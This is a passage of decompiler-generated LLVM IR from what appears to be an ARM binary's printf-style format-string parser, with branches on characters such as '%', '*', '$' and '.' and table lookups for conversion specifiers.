  %v3_134ac = load i8, i8* %v2_134ac, align 1
  %v7_134b0 = icmp eq i8 %v3_134ac, 37
  %v0_134b4 = load i32, i32* @r4, align 4
  %v1_134b4 = and i32 %v0_134b4, 10
  store i32 %v1_134b4, i32* %r3.global-to-local, align 4
  %v4_134b8 = udiv i32 %v1_134b4, 2
  %v5_134b8 = sub nuw nsw i32 -1, %v4_134b8
  %v6_134b8 = and i32 %v0_134b4, %v5_134b8
  store i32 %v6_134b8, i32* @r4, align 4
  br i1 %v7_134b0, label %dec_label_pc_134c0, label %dec_label_pc_1339c

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %bb133, %dec_label_pc_133fc, %dec_label_pc_13454, %dec_label_pc_134c0
  %v1_13508 = phi i32 [ %storemerge105, %dec_label_pc_134c0 ], [ %v0_13460, %bb133 ], [ %v0_13460, %dec_label_pc_13454 ], [ %v0_13460, %dec_label_pc_133fc ]
  %v0_13504 = phi i32 [ %v5_13484, %dec_label_pc_134c0 ], [ %v0_133fc, %bb133 ], [ %v0_133fc, %dec_label_pc_13454 ], [ %v0_133fc, %dec_label_pc_133fc ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_134c0 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_13454 ], [ %stack_var_-48.1, %dec_label_pc_133fc ]
  %v1_134c4 = inttoptr i32 %v0_13504 to i8*
  %v2_134c4 = load i8, i8* %v1_134c4, align 1
  %v3_134c4 = zext i8 %v2_134c4 to i32
  store i32 %v3_134c4, i32* %r3.global-to-local, align 4
  %v7_134c8 = icmp eq i8 %v2_134c4, 42
  br i1 %v7_134c8, label %dec_label_pc_134d0, label %dec_label_pc_13514

dec_label_pc_134d0:                               ; preds = %dec_label_pc_134c4
  %v0_134d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_134d0 = icmp eq i32 %v0_134d0, 0
  br i1 %v2_134d0, label %dec_label_pc_13504, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134d0
  %v1_134d8 = inttoptr i32 %v1_13508 to i8*
  %v2_134d8 = load i8, i8* %v1_134d8, align 1
  %v3_134d8 = zext i8 %v2_134d8 to i32
  store i32 %v3_134d8, i32* %r3.global-to-local, align 4
  %v7_134dc = icmp eq i8 %v2_134d8, 36
  br i1 %v7_134dc, label %dec_label_pc_134e4, label %dec_label_pc_1378c

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134d8
  %v0_134e4 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_134e4, 1
  br i1 %tmp134, label %dec_label_pc_1378c, label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134e4
  store i32 %v25_132f8, i32* %r1.global-to-local, align 4
  %v0_134f4 = load i32, i32* @lr, align 4
  %v3_134f4 = mul i32 %v0_134f4, -4
  %v4_134f4 = add i32 %v3_134f4, %v25_132f8
  store i32 %v4_134f4, i32* %r3.global-to-local, align 4
  %v1_134f8 = add i32 %v1_13508, 1
  store i32 %v1_134f8, i32* %r6.global-to-local, align 4
  %v2_134fc = add i32 %v4_134f4, -24
  %v3_134fc = inttoptr i32 %v2_134fc to i32*
  store i32 %v0_134e4, i32* %v3_134fc, align 4
  br label %dec_label_pc_13510

dec_label_pc_13504:                               ; preds = %dec_label_pc_134d0
  %v1_13504 = add i32 %v0_13504, 1
  store i32 %v1_13504, i32* %r3.global-to-local, align 4
  %v9_13508 = icmp eq i32 %v1_13504, %v1_13508
  br i1 %v9_13508, label %dec_label_pc_13510, label %dec_label_pc_1378c

dec_label_pc_13510:                               ; preds = %dec_label_pc_13504, %dec_label_pc_134ec
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13514

dec_label_pc_13514:                               ; preds = %dec_label_pc_134c4, %dec_label_pc_13510
  %v0_13514 = load i32, i32* @lr, align 4
  %v2_13514 = icmp eq i32 %v0_13514, 0
  br i1 %v2_13514, label %dec_label_pc_1351c, label %dec_label_pc_13334

dec_label_pc_1351c:                               ; preds = %dec_label_pc_13514
  %v0_1351c = load i32, i32* %r6.global-to-local, align 4
  %v1_1351c = inttoptr i32 %v0_1351c to i8*
  %v2_1351c = load i8, i8* %v1_1351c, align 1
  %v3_1351c = zext i8 %v2_1351c to i32
  store i32 %v3_1351c, i32* %r3.global-to-local, align 4
  %v7_13520 = icmp eq i8 %v2_1351c, 46
  br i1 %v7_13520, label %.thread22, label %dec_label_pc_13534

.thread22:                                        ; preds = %dec_label_pc_1351c
  %v2_13524 = add i32 %v0_1351c, 1
  store i32 %v2_13524, i32* %r6.global-to-local, align 4
  %v1_13528 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_13528, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_1339c

dec_label_pc_13534:                               ; preds = %dec_label_pc_1351c
  %v0_13534 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13534, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13334, %dec_label_pc_13534
  %v0_13544.pre = phi i32 [ %v0_1351c, %dec_label_pc_13534 ], [ %v0_13544.pre.pre, %dec_label_pc_13334 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_13534 ], [ %v0_13334, %dec_label_pc_13334 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_23f04.1064 to i32), i32* %r1.global-to-local, align 4
  %v1_13544 = inttoptr i32 %v0_13544.pre to i8*
  br label %dec_label_pc_13540

dec_label_pc_13540:                               ; preds = %dec_label_pc_13550, %dec_label_pc_1353c
  %v0_13550 = phi i32 [ %v1_13550, %dec_label_pc_13550 ], [ ptrtoint ([9 x i8]* @global_var_23f04.1064 to i32), %dec_label_pc_1353c ]
  %v1_13540 = inttoptr i32 %v0_13550 to i8*
  %v2_13540 = load i8, i8* %v1_13540, align 1
  %v3_13540 = zext i8 %v2_13540 to i32
  store i32 %v3_13540, i32* %r2.global-to-local, align 4
  %v2_13544 = load i8, i8* %v1_13544, align 1
  %v3_13544 = zext i8 %v2_13544 to i32
  store i32 %v3_13544, i32* %r3.global-to-local, align 4
  %v9_13548 = icmp eq i8 %v2_13544, %v2_13540
  br i1 %v9_13548, label %dec_label_pc_1333c, label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %dec_label_pc_13540
  %v1_13550 = add i32 %v0_13550, 1
  %v2_13550 = inttoptr i32 %v1_13550 to i8*
  %v3_13550 = load i8, i8* %v2_13550, align 1
  %v4_13550 = zext i8 %v3_13550 to i32
  store i32 %v4_13550, i32* %r3.global-to-local, align 4
  store i32 %v1_13550, i32* %r1.global-to-local, align 4
  %v2_13554 = icmp eq i8 %v3_13550, 0
  br i1 %v2_13554, label %dec_label_pc_1355c, label %dec_label_pc_13540

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13550, %dec_label_pc_1333c
  %v1_1357c = phi i32 [ %v1_1333c, %dec_label_pc_1333c ], [ %v0_13544.pre, %dec_label_pc_13550 ]
  %v1_13578 = phi i32 [ %v0_13550, %dec_label_pc_1333c ], [ %v1_13550, %dec_label_pc_13550 ]
  %v2_13560 = sub i32 %v1_13578, ptrtoint ([9 x i8]* @global_var_23f04.1064 to i32)
  store i32 %v2_13560, i32* %r3.global-to-local, align 4
  %v8_13568 = icmp sgt i32 %v2_13560, 1
  br i1 %v8_13568, label %.thread25, label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_1355c
  %v1_1356c = inttoptr i32 %v1_1357c to i8*
  %v2_1356c = load i8, i8* %v1_1356c, align 1
  %v3_1356c = zext i8 %v2_1356c to i32
  store i32 %v3_1356c, i32* %r2.global-to-local, align 4
  %v1_13570 = inttoptr i32 %v1_13578 to i8*
  %v2_13570 = load i8, i8* %v1_13570, align 1
  %v3_13570 = zext i8 %v2_13570 to i32
  store i32 %v3_13570, i32* %r3.global-to-local, align 4
  %v9_13574 = icmp eq i8 %v2_1356c, %v2_13570
  br i1 %v9_13574, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_1356c
  %v2_13578 = add i32 %v1_13578, 9
  store i32 %v2_13578, i32* %r1.global-to-local, align 4
  %v2_1357c = add i32 %v1_1357c, 1
  store i32 %v2_1357c, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1356c, %dec_label_pc_1355c, %bb135
  %v0_13584 = phi i32 [ %v1_13578, %dec_label_pc_1356c ], [ %v1_13578, %dec_label_pc_1355c ], [ %v2_13578, %bb135 ]
  %v0_13580 = phi i32 [ %v1_1357c, %dec_label_pc_1356c ], [ %v1_1357c, %dec_label_pc_1355c ], [ %v2_1357c, %bb135 ]
  %v1_13580 = inttoptr i32 %v0_13580 to i8*
  %v2_13580 = load i8, i8* %v1_13580, align 1
  %v3_13580 = zext i8 %v2_13580 to i32
  store i32 %v3_13580, i32* %r2.global-to-local, align 4
  %v1_13584 = add i32 %v0_13584, 9
  %v2_13584 = inttoptr i32 %v1_13584 to i8*
  %v3_13584 = load i8, i8* %v2_13584, align 1
  %v4_13584 = zext i8 %v3_13584 to i32
  store i32 %v4_13584, i32* %r3.global-to-local, align 4
  %v2_13588 = icmp eq i8 %v2_13580, 0
  %v3_1358c = mul nuw nsw i32 %v4_13584, 256
  store i32 %v3_1358c, i32* @lr, align 4
  br i1 %v2_13588, label %dec_label_pc_1378c, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32), i32* %ip.global-to-local, align 4
  %v3_13598 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_13598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13620, %dec_label_pc_13594
  %v1_135ac = phi i32 [ %v1_13620, %dec_label_pc_13620 ], [ ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32), %dec_label_pc_13594 ]
  %v1_1359c = inttoptr i32 %v1_135ac to i8*
  %v2_1359c = load i8, i8* %v1_1359c, align 1
  %v3_1359c = zext i8 %v2_1359c to i32
  store i32 %v3_1359c, i32* %r3.global-to-local, align 4
  %v9_135a0 = icmp eq i8 %v2_1359c, %v2_13580
  br i1 %v9_135a0, label %dec_label_pc_135a8, label %dec_label_pc_13620

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1359c
  store i32 ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32), i32* %r3.global-to-local, align 4
  %v2_135ac = sub i32 %v1_135ac, ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32)
  store i32 %v2_135ac, i32* %r2.global-to-local, align 4
  %v7_135b4 = icmp slt i32 %v2_135ac, 18
  br i1 %v7_135b4, label %bb137, label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %dec_label_pc_135a8
  %v1_135b8 = and i32 %v3_1358c, 1024
  %v2_135b8 = icmp eq i32 %v1_135b8, 0
  br i1 %v2_135b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_135b8
  %v2_135bc = add i32 %v2_135ac, -2
  store i32 %v2_135bc, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_135a8, %dec_label_pc_135b8, %bb136
  %v0_135c0 = phi i32 [ %v2_135ac, %dec_label_pc_135a8 ], [ %v2_135ac, %dec_label_pc_135b8 ], [ %v2_135bc, %bb136 ]
  %v1_135c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_135c0 = add i32 %v1_135c0, 32
  %v3_135c0 = inttoptr i32 %v2_135c0 to i32*
  store i32 %v0_135c0, i32* %v3_135c0, align 4
  store i32 ptrtoint (i32* @global_var_23f37.1068 to i32), i32* %r1.global-to-local, align 4
  %v0_135cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c8, %bb137
  %v0_135c8 = phi i32 [ %v1_135c8, %dec_label_pc_135c8 ], [ ptrtoint (i32* @global_var_23f37.1068 to i32), %bb137 ]
  %v1_135c8 = add i32 %v0_135c8, 1
  %v2_135c8 = inttoptr i32 %v1_135c8 to i8*
  %v3_135c8 = load i8, i8* %v2_135c8, align 1
  %v4_135c8 = zext i8 %v3_135c8 to i32
  store i32 %v4_135c8, i32* %r3.global-to-local, align 4
  store i32 %v1_135c8, i32* %r1.global-to-local, align 4
  %v8_135d0 = icmp sgt i32 %v0_135cc.pre, %v4_135c8
  br i1 %v8_135d0, label %dec_label_pc_135c8, label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135c8
  store i32 ptrtoint (i32* @global_var_23f28.1072 to i32), i32* %r0.global-to-local, align 4
  %v2_135dc = sub i32 %v1_135c8, ptrtoint (i32* @global_var_23f38.1070 to i32)
  %v2_135e0 = mul i32 %v2_135dc, 2
  store i32 %v2_135e0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23f18.1074 to i32), i32* %ip.global-to-local, align 4
  %v2_135e8 = add i32 %v2_135e0, ptrtoint (i32* @global_var_23f28.1072 to i32)
  store i32 %v2_135e8, i32* %r2.global-to-local, align 4
  %v1_135ec = add i32 %v2_135e0, add (i32 ptrtoint (i32* @global_var_23f28.1072 to i32), i32 1)
  %v2_135ec = inttoptr i32 %v1_135ec to i8*
  %v3_135ec = load i8, i8* %v2_135ec, align 1
  %v4_135ec = zext i8 %v3_135ec to i32
  store i32 %v4_135ec, i32* %r1.global-to-local, align 4
  %v2_135f0 = add i32 %v2_135e0, ptrtoint (i32* @global_var_23f18.1074 to i32)
  store i32 %v2_135f0, i32* %r2.global-to-local, align 4
  %v3_135f4 = inttoptr i32 %v2_135e8 to i8*
  %v4_135f4 = load i8, i8* %v3_135f4, align 2
  %v6_135f4 = zext i8 %v4_135f4 to i32
  store i32 %v6_135f4, i32* %r0.global-to-local, align 4
  %v1_135f8 = add i32 %v2_135e0, add (i32 ptrtoint (i32* @global_var_23f18.1074 to i32), i32 1)
  %v2_135f8 = inttoptr i32 %v1_135f8 to i8*
  %v3_135f8 = load i8, i8* %v2_135f8, align 1
  %v4_135f8 = zext i8 %v3_135f8 to i32
  store i32 %v4_135f8, i32* %r2.global-to-local, align 4
  %v3_135fc = inttoptr i32 %v2_135f0 to i8*
  %v4_135fc = load i8, i8* %v3_135fc, align 2
  %v6_135fc = zext i8 %v4_135fc to i32
  %v3_13600 = mul nuw i32 %v4_135ec, 16777216
  store i32 %v3_13600, i32* %r1.global-to-local, align 4
  %v4_13604 = sdiv i32 %v3_13600, 65536
  %v5_13604 = or i32 %v6_135f4, %v4_13604
  %v3_13608 = mul nuw i32 %v4_135f8, 16777216
  store i32 %v3_13608, i32* %r2.global-to-local, align 4
  %v4_1360c = sdiv i32 %v3_13608, 65536
  %v5_1360c = or i32 %v6_135fc, %v4_1360c
  store i32 %v5_1360c, i32* %r3.global-to-local, align 4
  %v0_13610 = load i32, i32* @lr, align 4
  %v2_13610 = or i32 %v5_13604, %v0_13610
  store i32 ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32), i32* %ip.global-to-local, align 4
  %v2_13618 = and i32 %v2_13610, %v5_1360c
  store i32 %v2_13618, i32* %r0.global-to-local, align 4
  %v0_13634.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1362c

dec_label_pc_13620:                               ; preds = %dec_label_pc_1359c
  %v1_13620 = add i32 %v1_135ac, 1
  %v2_13620 = inttoptr i32 %v1_13620 to i8*
  %v3_13620 = load i8, i8* %v2_13620, align 1
  %v4_13620 = zext i8 %v3_13620 to i32
  store i32 %v4_13620, i32* %r3.global-to-local, align 4
  store i32 %v1_13620, i32* %ip.global-to-local, align 4
  %v2_13624 = icmp eq i8 %v3_13620, 0
  br i1 %v2_13624, label %dec_label_pc_1362c, label %dec_label_pc_1359c

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13620, %dec_label_pc_135d4
  %v0_13638 = phi i32 [ %v0_13610, %dec_label_pc_135d4 ], [ %v3_1358c, %dec_label_pc_13620 ]
  %v0_13634 = phi i32 [ %v0_13634.pre, %dec_label_pc_135d4 ], [ %v0_13580, %dec_label_pc_13620 ]
  %v0_1362c = phi i32 [ %v2_13618, %dec_label_pc_135d4 ], [ %v3_13598, %dec_label_pc_13620 ]
  store i32 %v0_1362c, i32* %stack_var_-36, align 4
  %v0_13630 = load i32, i32* @r4, align 4
  %v1_13630 = and i32 %v0_13630, 4
  %v1_13634 = inttoptr i32 %v0_13634 to i8*
  %v2_13634 = load i8, i8* %v1_13634, align 1
  %v3_13634 = zext i8 %v2_13634 to i32
  store i32 %v3_13634, i32* %r1.global-to-local, align 4
  %v1_13638 = and i32 %v0_13638, 3840
  %v1_1363c = and i32 %v0_13630, -5
  %v2_13640 = or i32 %v1_1363c, %v1_13638
  store i32 %v2_13640, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_13630, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_13650 = load i32, i32* %r7.global-to-local, align 4
  %v2_13650 = add i32 %v1_13650, 12
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v3_13634, i32* %v3_13650, align 4
  %v0_13654 = load i32, i32* %r7.global-to-local, align 4
  %v1_13654 = add i32 %v0_13654, 4
  %v2_13654 = inttoptr i32 %v1_13654 to i32*
  %v3_13654 = load i32, i32* @r5, align 4
  store i32 %v3_13654, i32* %v2_13654, align 4
  %v4_13654 = add i32 %v0_13654, 8
  %v5_13654 = inttoptr i32 %v4_13654 to i32*
  %v6_13654 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_13654, i32* %v5_13654, align 4
  %v0_13658 = load i32, i32* %r3.global-to-local, align 4
  %v1_13658 = load i32, i32* %r7.global-to-local, align 4
  %v2_13658 = add i32 %v1_13658, 20
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v0_13658, i32* %v3_13658, align 4
  %v0_1365c = load i32, i32* %r2.global-to-local, align 4
  %v1_1365c = load i32, i32* %r7.global-to-local, align 4
  %v2_1365c = add i32 %v1_1365c, 16
  %v3_1365c = inttoptr i32 %v2_1365c to i32*
  store i32 %v0_1365c, i32* %v3_1365c, align 4
  %v0_13660 = load i32, i32* %r0.global-to-local, align 4
  %v1_13660 = load i32, i32* %r7.global-to-local, align 4
  %v2_13660 = add i32 %v1_13660, 28
  %v3_13660 = inttoptr i32 %v2_13660 to i32*
  store i32 %v0_13660, i32* %v3_13660, align 4
  %v0_13664 = load i32, i32* %ip.global-to-local, align 4
  %v1_13664 = inttoptr i32 %v0_13664 to i8*
  %v2_13664 = load i8, i8* %v1_13664, align 1
  %v3_13664 = zext i8 %v2_13664 to i32
  store i32 %v3_13664, i32* %r2.global-to-local, align 4
  %v2_13668 = icmp eq i8 %v2_13664, 0
  br i1 %v2_13668, label %dec_label_pc_13670, label %dec_label_pc_13688

dec_label_pc_13670:                               ; preds = %dec_label_pc_1362c
  %v0_13670 = load i32, i32* %r6.global-to-local, align 4
  %v1_13670 = inttoptr i32 %v0_13670 to i8*
  %v2_13670 = load i8, i8* %v1_13670, align 1
  %v3_13670 = zext i8 %v2_13670 to i32
  store i32 %v3_13670, i32* %r3.global-to-local, align 4
  %v7_13674 = icmp eq i8 %v2_13670, 109
  br i1 %v7_13674, label %dec_label_pc_1367c, label %dec_label_pc_1378c

dec_label_pc_1367c:                               ; preds = %dec_label_pc_13670
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_13680 = load i32, i32* %r7.global-to-local, align 4
  %v2_13680 = add i32 %v1_13680, 32
  %v3_13680 = inttoptr i32 %v2_13680 to i32*
  store i32 20, i32* %v3_13680, align 4
  %v0_13684 = load i32, i32* %r2.global-to-local, align 4
  %v1_13684 = load i32, i32* %r7.global-to-local, align 4
  %v2_13684 = add i32 %v1_13684, 28
  %v3_13684 = inttoptr i32 %v2_13684 to i32*
  store i32 %v0_13684, i32* %v3_13684, align 4
  br label %dec_label_pc_13688

dec_label_pc_13688:                               ; preds = %dec_label_pc_1362c, %dec_label_pc_1367c
  %v0_13688 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_13688, 1
  br i1 %tmp141, label %dec_label_pc_13740, label %dec_label_pc_13690

dec_label_pc_13690:                               ; preds = %dec_label_pc_13688
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13690
  %v8_136b0 = phi i32 [ 0, %dec_label_pc_13690 ], [ %v1_1372c, %dec_label_pc_13728 ]
  %v7_13698 = icmp sgt i32 %v8_136b0, 2
  br i1 %v7_13698, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_13694
  store i32 %v25_132f8, i32* %r2.global-to-local, align 4
  %v12_1369c = mul i32 %v8_136b0, 4
  %v13_1369c = add i32 %v12_1369c, %v25_132f8
  store i32 %v13_1369c, i32* %r3.global-to-local, align 4
  %v9_136a0 = add i32 %v13_1369c, -24
  %v10_136a0 = inttoptr i32 %v9_136a0 to i32*
  %v11_136a0 = load i32, i32* %v10_136a0, align 4
  store i32 %v11_136a0, i32* %r2.global-to-local, align 4
  %v9_136a4 = load i32, i32* %r7.global-to-local, align 4
  %v10_136a4 = add i32 %v9_136a4, %v8_136b0
  store i32 %v10_136a4, i32* %r3.global-to-local, align 4
  %v9_136ac = trunc i32 %v11_136a0 to i8
  %v11_136ac = add i32 %v10_136a4, 36
  %v12_136ac = inttoptr i32 %v11_136ac to i8*
  store i8 %v9_136ac, i8* %v12_136ac, align 1
  %v8_136b4 = load i32, i32* %r3.global-to-local, align 4
  %v9_136b4 = add i32 %v8_136b4, 36
  %v10_136b4 = inttoptr i32 %v9_136b4 to i8*
  %v11_136b4 = load i8, i8* %v10_136b4, align 1
  %v12_136b4 = zext i8 %v11_136b4 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_13694
  %v10_136b0 = add i32 %v8_136b0, %stack_var_-48.3
  store i32 %v10_136b0, i32* %r3.global-to-local, align 4
  %v9_136b8 = add i32 %v10_136b0, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_136dc = phi i32 [ %v12_136b4, %bb142 ], [ %v9_136b8, %bb143 ]
  store i32 %v0_136dc, i32* @r2, align 4
  %v1_136bc = load i32, i32* %sb.global-to-local, align 4
  %v2_136bc = sub i32 %v0_136dc, %v1_136bc
  %v4_136bc = xor i32 %v1_136bc, %v0_136dc
  %v5_136bc = xor i32 %v2_136bc, %v0_136dc
  %v6_136bc = and i32 %v5_136bc, %v4_136bc
  %v7_136bc = icmp slt i32 %v6_136bc, 0
  %v8_136bc = icmp slt i32 %v2_136bc, 0
  %v9_136bc = icmp eq i32 %v0_136dc, %v1_136bc
  %v3_136c0 = xor i1 %v8_136bc, %v7_136bc
  %v4_136c0 = or i1 %v9_136bc, %v3_136c0
  br i1 %v4_136c0, label %dec_label_pc_136d0, label %dec_label_pc_136c4

dec_label_pc_136c4:                               ; preds = %bb144
  %v1_136c4 = add i32 %v0_136dc, -9
  %v3_136c4 = sub i32 8, %v0_136dc
  %v4_136c4 = and i32 %v3_136c4, %v0_136dc
  %v5_136c4 = icmp slt i32 %v4_136c4, 0
  %v6_136c4 = icmp slt i32 %v1_136c4, 0
  %v7_136c4 = icmp eq i32 %v0_136dc, 9
  %v3_136c8 = xor i1 %v6_136c4, %v5_136c4
  %v4_136c8 = or i1 %v7_136c4, %v3_136c8
  br i1 %v4_136c8, label %dec_label_pc_136cc, label %dec_label_pc_1378c

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136c4
  store i32 %v0_136dc, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_136d0

dec_label_pc_136d0:                               ; preds = %bb144, %dec_label_pc_136cc
  store i32 %v25_132f8, i32* %ip.global-to-local, align 4
  %v1_136d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_136d4 = mul i32 %v1_136d4, 4
  %v5_136d4 = add i32 %v4_136d4, %v25_132f8
  store i32 %v5_136d4, i32* %r3.global-to-local, align 4
  %v1_136d8 = add i32 %v5_136d4, -12
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r5.global-to-local, align 4
  %v1_136dc = add i32 %v0_136dc, -1
  store i32 %v1_136dc, i32* %sl.global-to-local, align 4
  %v0_136e0 = load i32, i32* %r7.global-to-local, align 4
  %v4_136e0 = mul i32 %v1_136dc, 4
  %v5_136e0 = add i32 %v0_136e0, %v4_136e0
  store i32 %v5_136e0, i32* %r3.global-to-local, align 4
  %v7_136e4 = icmp eq i32 %v3_136d8, 8
  %v1_136e8 = add i32 %v5_136e0, 40
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* @r0, align 4
  br i1 %v7_136e4, label %dec_label_pc_13728, label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136d0
  %v9_136f0 = icmp eq i32 %v3_136e8, %v3_136d8
  br i1 %v9_136f0, label %dec_label_pc_13714, label %bb145

bb145:                                            ; preds = %dec_label_pc_136f0
  %v8_136f4 = icmp eq i32 %v3_136e8, 8
  br i1 %v8_136f4, label %dec_label_pc_13714, label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %bb145
  %v0_136fc = call i32 @_promoted_size()
  %v0_13704 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13704, i32* @r0, align 4
  %v0_13708 = call i32 @_promoted_size()
  store i32 %v0_13708, i32* %r0.global-to-local, align 4
  %v8_13710 = icmp sgt i32 %v0_136fc, %v0_13708
  br i1 %v8_13710, label %dec_label_pc_13728, label %dec_label_pc_136fc.dec_label_pc_13714_crit_edge

dec_label_pc_136fc.dec_label_pc_13714_crit_edge:  ; preds = %dec_label_pc_136fc
  %v1_13718.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_13720.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13720.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13714

dec_label_pc_13714:                               ; preds = %dec_label_pc_136fc.dec_label_pc_13714_crit_edge, %dec_label_pc_136f0, %bb145
  %v1_13720 = phi i32 [ %v1_13720.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v1_136dc, %dec_label_pc_136f0 ], [ %v1_136dc, %bb145 ]
  %v0_13720 = phi i32 [ %v0_13720.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v0_136e0, %dec_label_pc_136f0 ], [ %v0_136e0, %bb145 ]
  %v1_13718 = phi i32 [ %v1_13718.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v1_136d4, %dec_label_pc_136f0 ], [ %v1_136d4, %bb145 ]
  store i32 %v25_132f8, i32* %r1.global-to-local, align 4
  %v4_13718 = mul i32 %v1_13718, 4
  %v5_13718 = add i32 %v4_13718, %v25_132f8
  store i32 %v5_13718, i32* %r3.global-to-local, align 4
  %v1_1371c = add i32 %v5_13718, -12
  %v2_1371c = inttoptr i32 %v1_1371c to i32*
  %v3_1371c = load i32, i32* %v2_1371c, align 4
  store i32 %v3_1371c, i32* @r2, align 4
  %v4_13720 = mul i32 %v1_13720, 4
  %v5_13720 = add i32 %v4_13720, %v0_13720
  store i32 %v5_13720, i32* %r3.global-to-local, align 4
  %v2_13724 = add i32 %v5_13720, 40
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 %v3_1371c, i32* %v3_13724, align 4
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_136d0, %dec_label_pc_13714
  %v0_13728 = load i32, i32* %r7.global-to-local, align 4
  %v1_13728 = add i32 %v0_13728, 28
  %v2_13728 = inttoptr i32 %v1_13728 to i32*
  %v3_13728 = load i32, i32* %v2_13728, align 4
  %v0_1372c = load i32, i32* %r8.global-to-local, align 4
  %v1_1372c = add i32 %v0_1372c, 1
  store i32 %v1_1372c, i32* %r8.global-to-local, align 4
  %v1_13730 = add i32 %v3_13728, 2
  store i32 %v1_13730, i32* %r3.global-to-local, align 4
  %v6_13738 = icmp slt i32 %v1_1372c, %v1_13730
  br i1 %v6_13738, label %dec_label_pc_13694, label %dec_label_pc_13758

dec_label_pc_13740:                               ; preds = %dec_label_pc_13688
  %v0_13740 = load i32, i32* %r7.global-to-local, align 4
  %v1_13740 = add i32 %v0_13740, 28
  %v2_13740 = inttoptr i32 %v1_13740 to i32*
  %v3_13740 = load i32, i32* %v2_13740, align 4
  store i32 %v3_13740, i32* %r2.global-to-local, align 4
  %v0_13744 = load i32, i32* %r0.global-to-local, align 4
  %v1_13744 = trunc i32 %v0_13744 to i8
  %v3_13744 = add i32 %v0_13740, 38
  %v4_13744 = inttoptr i32 %v3_13744 to i8*
  store i8 %v1_13744, i8* %v4_13744, align 1
  %v0_13748 = load i32, i32* %r2.global-to-local, align 4
  %v3_13748 = mul i32 %v0_13748, 4
  store i32 %v3_13748, i32* @r2, align 4
  %v0_1374c = load i32, i32* %r7.global-to-local, align 4
  %v1_1374c = add i32 %v0_1374c, 40
